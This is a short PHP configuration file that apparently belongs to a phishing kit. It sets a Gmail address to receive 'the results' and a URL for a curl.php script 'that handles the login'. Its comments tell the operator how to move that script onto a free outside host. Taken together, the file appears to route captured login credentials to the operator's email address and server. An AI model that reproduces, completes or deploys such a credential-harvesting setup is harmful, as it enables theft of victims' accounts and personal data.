<?php

$send="mouadvbv@gmail.com"; // Will send the results at this address.

$remote="0";
$curl="http://www.myhost.com/mydir/curl.php?stats=";

// For a custom setup is possible to run curl.php (the file that handles the login) on a different host.
// Default remote is set to 0, this means that curl.php will run from the same host.
// If you want to run curl.php on other host, change remote value to 1: $remote="1";

// If you set the remote to 1, upload curl.php on other host (there are a lot of free hosts that allow curl usage)
// and change the value of $curl above to suit your needs.
// Example: If your host is myhost.100webspace.com and you uploaded curl.php in a dir named "mydir"
// then the $curl value will become: $curl="http://myhost.100webspace.com/mydir/curl.php?stats=";
// That's all.
?>